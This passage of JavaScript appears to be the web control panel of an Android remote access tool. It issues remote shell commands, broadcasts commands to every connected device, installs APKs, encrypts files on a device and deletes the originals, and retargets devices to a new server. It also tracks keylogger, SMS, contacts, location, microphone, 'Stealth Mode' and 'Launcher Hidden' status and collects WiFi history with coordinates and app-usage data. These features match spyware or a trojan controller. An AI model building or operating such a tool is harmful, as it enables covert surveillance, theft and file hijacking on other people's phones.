  if(!confirm('Delete ' + paths.length + ' item(s)?\n\n' + paths.slice(0,10).join('\n') + (paths.length>10?'\n…':''))) return;
  toast('Deleting ' + paths.length + ' items…');
  const r = await api('/api/file/bulk', {op:'delete', paths});
  if(r.error){ toast(r.error,'err'); return; }
  toast(r.success + '/' + r.total + ' deleted','ok',5000); addLog('🗑 bulk delete ' + r.success + '/' + r.total,'connect');
  fbSelected.clear(); fbRefresh();
}
async function bulkEncrypt(){ await bulkOp('encrypt','🔒'); }
async function bulkDecrypt(){ await bulkOp('decrypt','🔓'); }
async function bulkZipEnc(){ await bulkOp('zipenc','🗜'); }
async function bulkOp(op, icon){
  const paths = bulkPaths(); if(!paths.length) return;
  if(!confirm(op.toUpperCase() + ' ' + paths.length + ' item(s)?')) return;
  toast(icon + ' Processing ' + paths.length + ' items…');
  const r = await api('/api/file/bulk', {op, paths, password: bulkPw()});
  if(r.error){ toast(r.error,'err'); return; }
  toast(r.success + '/' + r.total + ' ' + op + ' done','ok',5000); addLog(icon + ' bulk ' + op + ' ' + r.success + '/' + r.total,'connect');
  fbSelected.clear(); fbRefresh();
}
async function bulkDownloadZip(){
  const paths = bulkPaths(); if(!paths.length) return;
  toast('Packing ' + paths.length + ' files into ZIP…');
  try{
    const res = await fetch('/api/file/download-zip', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({paths}) });
    if(!res.ok){ const err = await res.json().catch(()=>({error:'HTTP '+res.status})); toast(err.error || 'ZIP failed','err'); return; }
    const blob = await res.blob();
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    const stamp = new Date().toISOString().replace(/[:.]/g,'-').slice(0,19);
    a.href = url; a.download = 'termuxremote_bundle_' + stamp + '.zip';
    document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url);
    toast('ZIP downloaded (' + fmtSize(blob.size) + ')','ok');
    addLog('⬇ bulk zip (' + paths.length + ' files, ' + fmtSize(blob.size) + ')','connect');
  }catch(e){ toast('ZIP failed: ' + e.message,'err'); }
}
(function setupFileDrop(){
  const zone = $('drop-zone'); if(!zone) return;
  let depth = 0;
  window.addEventListener('dragenter', e => { if(!e.dataTransfer || !e.dataTransfer.types.includes('Files')) return; if(currentTab !== 'files') return; depth++; zone.classList.add('show'); e.preventDefault(); });
  window.addEventListener('dragover', e => { if(!e.dataTransfer || !e.dataTransfer.types.includes('Files')) return; if(currentTab !== 'files') return; e.preventDefault(); });
  window.addEventListener('dragleave', e => { depth--; if(depth <= 0){ depth = 0; zone.classList.remove('show'); } });
  window.addEventListener('drop', async e => {
    if(!e.dataTransfer || !e.dataTransfer.files.length) return;
    if(currentTab !== 'files') return;
    depth = 0; zone.classList.remove('show'); e.preventDefault();
    if(!activeId){ toast('No client selected','err'); return; }
    const files = [...e.dataTransfer.files]; if(!files.length) return;
    toast('Uploading ' + files.length + ' file(s)…');
    const fd = new FormData();
    for(const f of files) fd.append('files', f, f.name);
    try{
      const r = await fetch('/api/file/upload-multi', {method:'POST', body:fd}).then(x=>x.json());
      if(r.error){ toast(r.error,'err'); return; }
      toast(r.success + '/' + r.total + ' uploaded','ok',5000); addLog('⬆ multi-upload ' + r.success + '/' + r.total,'connect');
      fbRefresh();
    }catch(e){ toast('Upload failed: ' + e.message,'err'); }
  });
})();
function fbPw(){ const el=$('fb-encpw'); return el?(el.value||'').trim():''; }
async function fbEncrypt(name){
  if(!activeId){ toast('No client selected','err'); return; }
  if(!confirm('Encrypt "'+name+'" on the device?\n\nCreates '+name+'.enc and deletes the original.')) return;
  const pw = fbPw(); const args = pw?[name,pw]:[name];
  toast('Encrypting '+name+' on device…'); addLog('🔒 encrypt '+name,'info');
  const r = await sendCmd('encrypt', args, {silent:true});
  if(r.error){ toast(r.error,'err',5000); addLog('✗ encrypt: '+r.error,'err'); return; }
  toast(r.output||'Encrypted','ok',5000); addLog('✓ '+(r.output||'encrypted'),'connect');
  fbRefresh();
}
async function fbDecrypt(name){
  if(!activeId){ toast('No client selected','err'); return; }
  if(!confirm('Decrypt "'+name+'" on the device?')) return;
  const pw = fbPw(); const args = pw?[name,pw]:[name];
  toast('Decrypting '+name+' on device…'); addLog('🔓 decrypt '+name,'info');
  const r = await sendCmd('decrypt', args, {silent:true});
  if(r.error){ toast(r.error,'err',5000); addLog('✗ decrypt: '+r.error,'err'); return; }
  toast(r.output||'Decrypted','ok',5000); addLog('✓ '+(r.output||'decrypted'),'connect');
  fbRefresh();
}
async function fbZipEnc(name){
  if(!activeId){ toast('No client selected','err'); return; }
  if(!confirm('Zip "'+name+'" and encrypt it on the device?')) return;
  const pw = fbPw(); const args = pw?[name,pw]:[name];
  toast('Zip+Encrypting '+name+' on device…'); addLog('🗜 zipenc '+name,'info');
  const r = await sendCmd('zipenc', args, {silent:true});
  if(r.error){ toast(r.error,'err',5000); addLog('✗ zipenc: '+r.error,'err'); return; }
  toast(r.output||'Zip+Encrypt done','ok',5000); addLog('✓ '+(r.output||'zipenc done'),'connect');
  fbRefresh();
}
async function fbUnzipDec(name){
  if(!activeId){ toast('No client selected','err'); return; }
  if(!confirm('Decrypt "'+name+'" and unzip it on the device?')) return;
  const pw = fbPw(); const args = pw?[name,pw]:[name];
  toast('Decrypt+Unzipping '+name+' on device…'); addLog('📂 unzipdec '+name,'info');
  const r = await sendCmd('unzipdec', args, {silent:true});
  if(r.error){ toast(r.error,'err',5000); addLog('✗ unzipdec: '+r.error,'err'); return; }
  toast(r.output||'Decrypt+Unzip done','ok',5000); addLog('✓ '+(r.output||'unzipdec done'),'connect');
  fbRefresh();
}
async function fbInstall(name){
  if(!activeId){ toast('No client selected','err'); return; }
  if(!confirm('Install "'+name+'" on the device?')) return;
  toast('Installing '+name+'…'); addLog('📦 install '+name,'info');
  const r = await api('/api/install', {path: name});
  if(r.error){ toast(r.error,'err',5000); return; }
  toast(r.output||'Install triggered','ok',6000); addLog('✓ '+(r.output||'install ok'),'connect');
}
async function fbEnter(name){ const r = await sendCmd('cd',[name]); if(r.error){ toast(r.error,'err'); return; } if(r.cwd) currentCwd=r.cwd; updateCwdUI(); fbRefresh(); }
async function fbUp(){ const r = await sendCmd('cd',['..']); if(r.error){ toast(r.error,'err'); return; } if(r.cwd) currentCwd=r.cwd; updateCwdUI(); fbRefresh(); }
async function fbHome(){ const r = await sendCmd('cd',['/']); if(r.error){ toast(r.error,'err'); return; } if(r.cwd) currentCwd=r.cwd; updateCwdUI(); fbRefresh(); }
async function fbDownload(name){
  toast('Downloading '+name+'…');
  const r = await api('/api/get', {remote: name});
  if(r.error){ toast(r.error,'err'); return; }
  const a=document.createElement('a'); a.href=r.url; a.download=r.name;
  document.body.appendChild(a); a.click(); a.remove();
  addCapture(r.name, r.size, kindFromName(r.name), false);
  toast('Downloaded '+r.name+' ('+fmtSize(r.size)+')','ok');
}
async function fbDelete(name, type){ if(!confirm('Delete '+type+' "'+name+'"?')) return; const r = await sendCmd('rm',[name]); if(r.error){ toast(r.error,'err'); return; } toast('Deleted '+name,'ok'); fbRefresh(); }
async function fbNewFolder(){ const name=prompt('Folder name:'); if(!name) return; const r = await sendCmd('mkdir',[name]); if(r.error){ toast(r.error,'err'); return; } toast('Created '+name,'ok'); fbRefresh(); }
$('fb-upload').addEventListener('change', async e=>{
  const files = [...e.target.files]; if(!files.length) return;
  if(files.length === 1){
    const f=files[0];
    const remote=prompt('Save on phone as:', f.name)||f.name;
    toast('Uploading '+f.name+'…');
    const fd=new FormData(); fd.append('file', f); fd.append('remote', remote);
    try{
      const r=await fetch('/api/put',{method:'POST',body:fd}).then(x=>x.json());
      if(r.error) toast(r.error,'err'); else { toast('Uploaded '+remote,'ok'); fbRefresh(); }
    }catch(err){ toast('Upload failed: '+err.message,'err'); }
  } else {
    toast('Uploading ' + files.length + ' file(s)…');
    const fd = new FormData();
    for(const f of files) fd.append('files', f, f.name);
    try{
      const r = await fetch('/api/file/upload-multi', {method:'POST', body:fd}).then(x=>x.json());
      if(r.error) toast(r.error,'err'); else { toast(r.success + '/' + r.total + ' uploaded','ok'); fbRefresh(); }
    }catch(err){ toast('Upload failed: '+err.message,'err'); }
  }
  e.target.value='';
});

// ═══ Apps / Data / System ═══
async function loadApps(force){
  if(!activeId){ toast('No client selected','err'); return; }
  const status = $('apps-status'); const grid = $('apps-grid'); const countEl = $('apps-count');
  status.textContent = 'Loading apps from device…'; status.style.color = 'var(--text-mute)';
  if(!appListData.length){ grid.innerHTML = '<div class="gallery-empty">Loading…</div>'; }
  try{
    const qs = force?'?force=1':'';
    const r = await fetch('/api/apps'+qs).then(x=>x.json());
    if(r.error){ status.textContent = '✗ '+r.error; status.style.color='var(--red)'; grid.innerHTML='<div class="gallery-empty">'+esc(r.error)+'</div>'; return; }
    appListData = r.apps || [];
    status.textContent = 'Loaded '+appListData.length+' apps'+(r.cached?' (cached)':'');
    status.style.color='var(--green)';
    if(countEl) countEl.textContent = appListData.length+' apps';
    addLog('📦 loaded '+appListData.length+' apps'+(r.cached?' (cached)':''),'info');
    renderApps();
  }catch(e){ status.textContent='✗ '+e.message; status.style.color='var(--red)'; grid.innerHTML='<div class="gallery-empty">'+esc(e.message)+'</div>'; }
}
function renderApps(){
  const grid = $('apps-grid');
  const search = ($('app-search').value||'').toLowerCase().trim();
  const showSys = $('app-show-system').checked;
  if(!appListData.length){ grid.innerHTML='<div class="gallery-empty">No apps loaded — click Refresh</div>'; return; }
  const filtered = appListData.filter(a=>{ if(a.system && !showSys) return false; if(!search) return true; return (a.label||'').toLowerCase().includes(search) || (a.pkg||'').toLowerCase().includes(search); });
  if(!filtered.length){ grid.innerHTML='<div class="gallery-empty">No matches</div>'; return; }
  grid.innerHTML = filtered.map(a=>{
    const initial = (a.label||'?').charAt(0).toUpperCase();
    const sysBadge = a.system ? '<span style="background:rgba(255,204,102,.85);color:#3a2a00;font-size:9px;padding:1px 6px;border-radius:8px;font-weight:700;margin-left:6px">sys</span>' : '';
    return '<div class="gallery-item" style="padding:14px">'
      + '<div style="display:flex;align-items:center;gap:12px;margin-bottom:10px">'
      +   '<div style="width:44px;height:44px;border-radius:11px;background:var(--grad2);display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:700;color:#fff;flex-shrink:0">'+esc(initial)+'</div>'
      +   '<div style="flex:1;min-width:0">'
      +     '<div style="font-size:13px;font-weight:600;color:var(--text);overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="'+esc(a.label)+'">'+esc(a.label)+sysBadge+'</div>'
      +     '<div style="font-size:10.5px;color:var(--text-mute);font-family:ui-monospace,Consolas,monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="'+esc(a.pkg)+'">'+esc(a.pkg)+'</div>'
      +   '</div></div>'
      + '<div style="display:flex;gap:6px">'
      +   '<button class="btn small primary" style="flex:1" onclick="launchApp(\''+esc(a.pkg).replace(/'/g,"\\'")+'\',\''+esc(a.activity||'').replace(/'/g,"\\'")+'\',this)">▶ Open</button>'
      +   '<button class="btn small" onclick="showAppInfo(\''+esc(a.pkg).replace(/'/g,"\\'")+'\')">ℹ</button>'
      + '</div></div>';
  }).join('');
}
async function launchApp(pkg, activity, btn){
  if(!activeId){ toast('No client selected','err'); return; }
  if(btn){ btn.disabled=true; btn.textContent='Opening…'; }
  try{
    const r = await api('/api/app/open', {pkg, activity});
    if(r.error){ toast(r.error,'err',5000); addLog('✗ appopen '+pkg+': '+r.error,'err'); }
    else { toast('Launched: '+pkg,'ok'); addLog('▶ launched '+pkg+' ('+(r.output||'')+')','connect'); }
  }catch(e){ toast(e.message,'err'); }
  finally{ if(btn){ btn.disabled=false; btn.textContent='▶ Open'; } }
}
async function showAppInfo(pkg){
  if(!activeId){ toast('No client selected','err'); return; }
  try{
    const r = await api('/api/app/info', {pkg});
    if(r.error){ toast(r.error,'err'); return; }
    const o = JSON.parse(r.output);
    alert('Package: '+o.pkg+'\nLabel: '+o.label+'\nVersion: '+o.versionName+' ('+o.versionCode+')\nUID: '+o.uid+'\nTarget SDK: '+o.targetSdk+'\nMin SDK: '+o.minSdk+'\nSystem: '+(o.system?'yes':'no')+'\nEnabled: '+(o.enabled?'yes':'no')+'\nLaunchable: '+(o.launchable?'yes':'no')+'\nData dir: '+o.dataDir+'\nAPK: '+o.sourceDir);
  }catch(e){ toast(e.message,'err'); }
}
document.querySelectorAll('.subtab').forEach(s=> s.addEventListener('click',()=>{
  document.querySelectorAll('.subtab').forEach(x=>x.classList.remove('active'));
  s.classList.add('active'); dataKind=s.dataset.kind; loadData();
}));
async function loadData(){
  if(!activeId){ toast('No client selected','err'); return; }
  const lim=$('data-limit').value.trim();
  const args=lim?[lim]:[];
  $('data-output').textContent='Loading…';
  const r = await sendCmd(dataKind, args, {silent:true});
  if(r.error){ $('data-output').textContent='✗ '+r.error; toast(r.error,'err'); return; }
  $('data-output').textContent=r.output||'(empty)';
  addLog('▶ '+dataKind+(lim?' '+lim:''),'info');
}
function copyData(){ const t=$('data-output').textContent; navigator.clipboard.writeText(t).then(()=>toast('Copied','ok'),()=>toast('Copy failed','err')); }
async function runShell(){
  const cmd=$('shell-input').value.trim(); if(!cmd) return;
  const out=$('shell-output'); out.textContent='Running…';
  const r = await sendCmd('shell',[cmd],{silent:true});
  if(r.error){ out.textContent='✗ '+r.error; toast(r.error,'err'); return; }
  out.textContent=(r.output||'(no output)')+(r.exit!==undefined?'\n[exit '+r.exit+']':'');
  addLog('▶ shell '+cmd,'info');
}
async function runCustom(){
  const line=$('custom-cmd').value.trim(); if(!line) return;
  const out=$('custom-output'); out.textContent='Sending…';
  try{ const r = await sendLine(line, {silent:true}); out.textContent=JSON.stringify(r,null,2); addLog('▶ '+line,'info'); }
  catch(e){ out.textContent='✗ '+e.message; }
}
async function runAll(){
  const line=$('all-cmd').value.trim(); if(!line) return;
  const out=$('all-output'); out.textContent='Broadcasting…';
  const r = await api('/api/all', {line});
  if(r.error){ out.textContent='✗ '+r.error; return; }
  out.textContent=(r.results||[]).map(x=>x.id+': '+x.out).join('\n')||'(no clients)';
  addLog('📡 broadcast: '+line,'info');
}

// ═══ Tools ═══
async function doHash(){
  const algoEl = document.querySelector('#hash-algo button.active');
  const algo = algoEl ? algoEl.dataset.a : 'sha256';
  const path = $('hash-path').value.trim();
  if(!path){ toast('Enter a path','warn'); return; }
  const out = $('hash-out'); out.textContent = 'calculating…';
  const r = await api('/api/hash', {algo, path});
  out.textContent = JSON.stringify(r, null, 2);
  if(r.error) toast(r.error,'err'); else addLog('🔐 hash '+path,'connect');
}
async function doMounts(){
  const out = $('mounts-out'); out.textContent = 'loading…';
  const r = await api('/api/mounts');
  out.textContent = r.output || r.error || '—';
}
async function doMount(){
  const dev = $('mount-dev').value.trim();
  const path = $('mount-path').value.trim();
  if(!dev || !path){ toast('device and path required','warn'); return; }
  if(!confirm('Mount ' + dev + ' → ' + path + '  (root required)?')) return;
  const r = await api('/api/mount', {device: dev, path});
  $('mounts-out').textContent = JSON.stringify(r, null, 2);
  if(r.error) toast(r.error,'err'); else { toast('Mount issued','ok'); setTimeout(doMounts, 1000); }
}
async function doDuTree(){
  const path = $('du-path').value.trim();
  const out = $('du-out'); out.textContent = 'analyzing…';
  const qs = path ? ('?path=' + encodeURIComponent(path)) : '';
  const r = await api('/api/du/tree' + qs);
  out.textContent = r.output || r.error || '—';
}
async function doInstall(){
  const path = $('install-path').value.trim();
  if(!path){ toast('Enter an APK path','warn'); return; }
  if(!confirm('Install ' + path + ' on device?')) return;
  const r = await api('/api/install', {path});
  if(r.error){ toast(r.error,'err'); return; }
  toast(r.output || 'Install triggered','ok',6000);
  addLog('📦 install '+path,'info');
}
document.querySelectorAll('#reboot-mode button').forEach(b=> b.addEventListener('click',()=>{
  document.querySelectorAll('#reboot-mode button').forEach(x=>x.classList.remove('active'));
  b.classList.add('active');
}));
async function doReboot(){
  const el = document.querySelector('#reboot-mode button.active');
  const mode = el ? el.dataset.m : 'normal';
  if(!confirm('Reboot device now (' + mode + ')?')) return;
  const r = await api('/api/reboot', {mode});
  if(r.error){ toast(r.error,'err'); return; }
  toast(r.output || 'Reboot issued','ok',6000);
  addLog('⏻ reboot ' + mode,'info');
}
async function stealthCmd(action){
  const out = $('stealth-out'); out.textContent = 'working…';
  const r = await api('/api/stealth', {action});
  out.textContent = r.output || r.error || '—';
  if(r.error) toast(r.error,'err'); else toast('stealth ' + action + ' OK','ok',3000);
}
$('chunkup-file').addEventListener('change', async e => {
  const f = e.target.files[0]; if(!f) return;
  let remote = $('chunkup-remote').value.trim();
  if(!remote){ remote = prompt('Remote path on device:', '/sdcard/' + f.name) || ('/sdcard/' + f.name); $('chunkup-remote').value = remote; }
  const st = $('chunkup-status'); const bar = $('chunkup-bar');
  st.textContent = 'starting upload…'; bar.style.width = '0%';
  try{
    const start = await api('/api/file/upload-chunk/start', {path: remote, size: f.size, chunk_size: 256*1024});
    if(start.error){ st.textContent = '✗ ' + start.error; return; }
    const uploadId = start.upload_id;
    const chunkSize = start.chunk_size;
    let offset = 0;
    const total = f.size;
    while(offset < total){
      const blob = f.slice(offset, offset + chunkSize);
      const fd = new FormData();
      fd.append('upload_id', uploadId);
      fd.append('file', blob, f.name);
      const r = await fetch('/api/file/upload-chunk/blob', {method:'POST', body: fd}).then(x=>x.json());
      if(r.error){ st.textContent = '✗ ' + r.error; return; }
      offset = r.received;
      const pct = Math.round(100 * offset / total);
      bar.style.width = pct + '%';
      st.textContent = 'uploading ' + fmtSize(offset) + ' / ' + fmtSize(total) + ' (' + pct + '%)';
      if(r.done){ st.textContent = '✓ uploaded ' + fmtSize(total) + ' → ' + remote; toast('Chunked upload done','ok',5000); addLog('⬆ chunked upload ' + remote + ' (' + fmtSize(total) + ')','connect'); break; }
    }
  }catch(err){ st.textContent = '✗ ' + err.message; }
  e.target.value = '';
});

// ═══ Network / Perms / Crypto ═══
async function loadNet(){
  if(!activeId){ $('net-current').textContent='no client selected'; return; }
  const r = await sendCmd('getnet',[],{silent:true});
  if(r.error){ $('net-current').textContent = '✗ '+r.error; return; }
  try{ const o = JSON.parse(r.output);
    $('net-current').textContent = 'current → '+o.ip+':'+o.port+'  ·  token '+o.token+'  ·  '+(o.connected?'connected':'offline')+'  ·  id '+(o.clientId||'?');
    $('net-ip').value = o.ip; $('net-port').value = o.port;
  }catch(_){ $('net-current').textContent = r.output || '?'; }
}
async function saveNet(){
  if(!activeId){ toast('No client selected','err'); return; }
  const ip = $('net-ip').value.trim(); const port = $('net-port').value.trim(); const tok = $('net-token').value.trim();
  const st = $('net-status');
  if(!ip || !port){ st.textContent='ip and port required'; st.style.color='var(--red)'; return; }
  if(!confirm('Reconnect device to '+ip+':'+port+'?')) return;
  st.textContent='sending…'; st.style.color='var(--text-dim)';
  const r = await api('/api/setnet', {ip, port, token: tok});
  if(r.error){ st.textContent='✗ '+r.error; st.style.color='var(--red)'; toast(r.error,'err'); return; }
  st.textContent = '✓ '+(r.output||'ok'); st.style.color='var(--green)';
  toast('Endpoint updated — device reconnecting','ok',5000); addLog('🌐 setnet → '+ip+':'+port,'connect');
  $('net-token').value=''; setTimeout(loadNet, 3500);
}
async function loadPerms(){
  if(!activeId){ $('perm-list').innerHTML='<div style="color:var(--text-mute)">select a client</div>'; return; }
  const r = await sendCmd('statusperm',[],{silent:true});
  if(r.error){ $('perm-list').innerHTML='<div style="color:var(--red)">'+esc(r.error)+'</div>'; return; }
  try{
    const o = JSON.parse(r.output);
    const items = [['allFiles','All Files'],['screenCapture','Screen Capture'],['overlay','Draw Over Apps'],['camera','Camera'],['mic','Microphone'],['location','Location'],['sms','SMS'],['contacts','Contacts'],['keylogger','Keylogger'],['notifListener','Notif Listener'],['usageAccess','Usage Access'],['stealth','Stealth Mode'],['launcherHidden','Launcher Hidden'],['deviceAdminActive','Device Admin']];
    $('perm-list').innerHTML = items.map(([k,label])=>{
      const v = !!o[k];
      const dot = '<span class="status-dot '+(v?'ok':'bad')+'"></span>';
      const color = v?'var(--green)':'var(--red)';
      return '<div class="info-item"><div class="label">'+dot+label+'</div><div class="value" style="color:'+color+'">'+(v?'granted':'not granted')+'</div></div>';
    }).join('');
  }catch(e){ $('perm-list').innerHTML='<div style="color:var(--red)">parse error</div>'; }
}
async function reqScreen(){
  if(!activeId){ toast('No client selected','err'); return; }
  const r = await sendCmd('reqscreen',[],{silent:true});
  if(r.error){ toast(r.error,'err'); return; }
  toast(r.output||'Check device screen','ok',6000);
  addLog('📸 requested screen capture','info');
  // Poll for confirmation for 30s
  let waited = 0;
  const poll = setInterval(async () => {
    waited += 2000;
    const ok = await checkProjectionState();
    if(ok || waited > 30_000){ clearInterval(poll); }
  }, 2000);
}
async function reqOverlay(){ if(!activeId){ toast('No client selected','err'); return; } const r = await sendCmd('reqoverlay',[],{silent:true}); if(r.error){ toast(r.error,'err'); return; } toast(r.output||'Opening overlay settings','ok',6000); addLog('🪟 requested overlay','info'); }
async function askPerm(what){ if(!activeId){ toast('No client selected','err'); return; } const r = await api('/api/askperm', {what}); if(r.error){ toast(r.error,'err'); return; } toast(r.output||('asking '+what),'ok',5000); addLog('🔐 askperm '+what+' → '+(r.output||''),'info'); }
async function loadEncStatus(){
  try{
    const r = await api('/api/enc/status');
    if(r.error){ $('enc-status').textContent = '✗ '+r.error; return; }
    $('enc-status').innerHTML = 'server crypto   : '+(r.crypto_available?'<span style="color:var(--green)">ready</span>':'<span style="color:var(--red)">missing (pip install cryptography)</span>')
      + '<br>algorithm       : '+r.algorithm
      + '<br>kdf             : '+r.kdf
      + '<br>iterations      : '+r.iterations
      + '<br>master key      : '+(r.master_set?'set':'derived from SECRET')
      + '<br>auto-enc media  : '+(r.auto_encrypt_media?'<span style="color:var(--green)">ON</span>':'off');
  }catch(e){ $('enc-status').textContent = '✗ '+e.message; }
}
async function setEncKey(){ if(!activeId){ toast('No client selected','err'); return; } const pw = $('enc-key').value; if(!pw){ toast('Type a password first','warn'); return; } const r = await sendCmd('setenckey',[pw],{silent:true}); if(r.error){ toast(r.error,'err'); return; } toast(r.output||'saved','ok'); $('enc-key').value=''; getEncKey(); }
async function getEncKey(){ if(!activeId){ toast('No client selected','err'); return; } const r = await sendCmd('getenckey',[],{silent:true}); toast(r.output||r.error||'?','info',5000); }
async function encOne(op){
  if(!activeId){ toast('No client selected','err'); return; }
  const name = $('enc-file').value.trim(); const pw = $('enc-file-pw').value; const out = $('enc-one-out');
  if(!name){ toast('Enter a filename','warn'); return; }
  out.textContent = 'working…';
  const args = pw?[name,pw]:[name];
  const r = await sendCmd(op, args, {silent:true});
  out.textContent = JSON.stringify(r, null, 2);
  if(r.error){ toast(r.error,'err'); return; }
  toast((r.output||'done'),'ok',5000); addLog('🔐 '+op+' '+name,'connect');
  if(op==='encrypt' && r.filename){ addCapture(r.filename, r.size||0, 'enc', true); }
}
async function encGetRemote(){
  if(!activeId){ toast('No client selected','err'); return; }
  const name = $('enc-file').value.trim(); const pw = $('enc-file-pw').value;
  if(!name){ toast('Enter a filename','warn'); return; }
  const out = $('enc-one-out'); out.textContent = 'pulling + encrypting…';
  const args = pw?[name,pw]:[name];
  const r = await sendCmd('encryptget', args, {silent:true});
  if(r.error){ out.textContent='✗ '+r.error; toast(r.error,'err'); return; }
  if(!r.file){ out.textContent='no data'; return; }
  const blob = await (await fetch('data:application/octet-stream;base64,'+r.file)).blob();
  const fd = new FormData(); fd.append('file', blob, r.filename||(name+'.enc')); fd.append('remote', r.filename||(name+'.enc'));
  const up = await fetch('/api/enc/upload', {method:'POST', body:fd}).then(x=>x.json());
  out.textContent = JSON.stringify(up, null, 2);
  if(up.error){ toast(up.error,'err'); return; }
  toast('Encrypted & saved: '+up.name,'ok',5000); addCapture(up.name, up.size||0, 'enc', false);
  addLog('🔒 encryptget '+name+' → '+up.name,'connect');
}
async function encZip(op){
  if(!activeId){ toast('No client selected','err'); return; }
  const name = $('enc-file').value.trim(); const pw = $('enc-file-pw').value; const out = $('enc-one-out');
  if(!name){ toast('Enter a filename','warn'); return; }
  out.textContent = 'running '+op+'…';
  const args = [name]; if(pw) args.push(pw);
  const cmd = (op==='zip')?'zipenc':'unzipdec';
  const r = await sendCmd(cmd, args, {silent:true});
  out.textContent = JSON.stringify(r, null, 2);
  if(r.error){ toast(r.error,'err'); return; }
  toast(r.output||op+' ok','ok',5000); addLog('🗜 '+op+' '+name,'connect');
  if(r.filename) addCapture(r.filename, r.size||0, kindFromName(r.filename), false);
  if(currentTab==='files') fbRefresh();
}
document.querySelectorAll('#enc-batch-op button').forEach(b=> b.addEventListener('click',()=>{
  document.querySelectorAll('#enc-batch-op button').forEach(x=>x.classList.remove('active')); b.classList.add('active');
}));
async function encBatch(){
  const opEl = document.querySelector('#enc-batch-op button.active');
  const op = opEl ? opEl.dataset.op : 'encrypt';
  const pattern = $('enc-pattern').value.trim() || '*';
  const pw = $('enc-batch-pw').value;
  const out = $('enc-batch-out'); out.textContent = 'running…';
  const r = await api('/api/enc/all', {op, pattern, password: pw});
  if(r.error){ out.textContent='✗ '+r.error; toast(r.error,'err'); return; }
  out.textContent = 'op: '+r.op+'\ndone:\n  '+(r.done||[]).join('\n  ')+(r.errors && r.errors.length?'\nerrors:\n  '+r.errors.join('\n  '):'');
  toast(op+': '+(r.done||[]).length+' files','ok',5000); addLog('🔐 batch '+op+' "'+pattern+'" → '+(r.done||[]).length+' files','connect');
}
$('enc-upload').addEventListener('change', async e=>{
  const f = e.target.files[0]; if(!f) return;
  const name = $('enc-upload-name').value.trim() || f.name;
  const out = $('enc-upload-out'); out.textContent = 'uploading…';
  const fd = new FormData(); fd.append('file', f); fd.append('remote', name);
  const r = await fetch('/api/enc/upload', {method:'POST', body:fd}).then(x=>x.json());
  out.textContent = JSON.stringify(r, null, 2);
  if(r.error){ toast(r.error,'err'); return; }
  toast('Uploaded as '+r.name,'ok',5000); addCapture(r.name, r.size, 'enc', false);
  e.target.value='';
});

// ═══ Monitor ═══
async function loadWifiHistory(){
  const list = $('wifi-history-list');
  try{
    const r = await api('/api/wifi/history?limit=200');
    const entries = r.entries || [];
    if(!entries.length){ list.innerHTML = '<div style="color:var(--text-mute)">No WiFi history yet.</div>'; return; }
    list.innerHTML = entries.slice().reverse().map(e => {
      const t = new Date((e.ts||0)*1000).toTimeString().slice(0,8);
      const loc = (e.lat && e.lon) ? ' <span style="color:var(--blue)">@ '+e.lat.toFixed(4)+','+e.lon.toFixed(4)+'</span>' : '';
      const prev = e.prev ? ' <span style="color:var(--text-mute)">(was '+esc(e.prev)+')</span>' : '';
      return '<div class="log-entry wifi"><span class="ts">'+t+'</span><span class="txt">📶 '+esc(e.ssid||'?')+prev+loc+'</span></div>';
    }).join('');
  }catch(e){ list.innerHTML = '<div style="color:var(--red)">'+esc(e.message)+'</div>'; }
}
async function currentWifi(){
  const r = await api('/api/wifi/current', {});
  try{ const o = JSON.parse(r.output||'{}'); $('wifi-current').textContent = 'SSID: ' + (o.ssid||'?'); }
  catch(_){ $('wifi-current').textContent = r.output || r.error || '?'; }
}
async function pullWifiDevice(){
  const r = await api('/api/wifi/pull-device', {limit: 200});
  if(r.error){ toast(r.error,'err'); return; }
  try{
    const arr = JSON.parse(r.output||'[]');
    const list = $('wifi-history-list');
    if(!arr.length){ list.innerHTML = '<div style="color:var(--text-mute)">(no entries on device)</div>'; return; }
    list.innerHTML = arr.slice().reverse().map(e => {
      const t = new Date((e.ts||0)).toTimeString().slice(0,8);
      const loc = (e.lat && e.lon) ? ' <span style="color:var(--blue)">@ '+e.lat.toFixed(4)+','+e.lon.toFixed(4)+'</span>' : '';
      const prev = e.prev ? ' <span style="color:var(--text-mute)">(was '+esc(e.prev)+')</span>' : '';
      return '<div class="log-entry wifi"><span class="ts">'+t+'</span><span class="txt">📶 '+esc(e.ssid||'?')+prev+loc+'</span></div>';
    }).join('');
    toast('Loaded ' + arr.length + ' entries from device','ok');
  }catch(e){ toast('Parse failed: ' + e.message,'err'); }
}
async function clearWifiHistory(){
  if(!confirm('Clear WiFi history (server + device)?')) return;
  await api('/api/wifi/clear', {});
  toast('WiFi history cleared','ok');
  loadWifiHistory();
}
async function loadUsageStats(){
  if(!activeId){ toast('No client selected','err'); return; }
  const hours = parseInt($('usage-hours').value) || 24;
  const limit = parseInt($('usage-limit').value) || 30;
  const wrap = $('usage-table-wrap');
  wrap.innerHTML = '<div style="color:var(--text-mute)">Loading…</div>';
  try{
    const r = await api('/api/usage/stats?hours='+hours+'&limit='+limit);
    if(r.error){ wrap.innerHTML = '<div style="color:var(--red)">'+esc(r.error)+'</div>'; return; }
    const o = JSON.parse(r.output);
    const apps = o.apps || [];
    if(!apps.length){ wrap.innerHTML = '<div style="color:var(--text-mute)">No usage data (grant Usage Access first).</div>'; $('usage-bar-chart').style.display = 'none'; return; }
    const maxMs = Math.max(...apps.map(a=>a.ms||0), 1);
    const chart = $('usage-bar-chart');
    chart.style.display = 'flex';
    chart.innerHTML = apps.slice(0, 30).map(a => {
      const h = Math.max(2, Math.round(60 * (a.ms / maxMs)));
      const cls = (a.ms/maxMs) > 0.7 ? 'bad' : (a.ms/maxMs) > 0.4 ? 'warn' : '';
      return '<div class="bar '+cls+'" style="height:'+h+'px" title="'+esc(a.label)+' — '+a.min+'m"></div>';
    }).join('');
    wrap.innerHTML = '<table class="data-table"><thead><tr><th>App</th><th>Package</th><th>Time</th></tr></thead><tbody>'
      + apps.map(a => '<tr><td>'+esc(a.label)+'</td><td>'+esc(a.pkg)+'</td><td>'+a.min+' min</td></tr>').join('')
      + '</tbody></table>';
  }catch(e){ wrap.innerHTML = '<div style="color:var(--red)">'+esc(e.message)+'</div>'; }
}
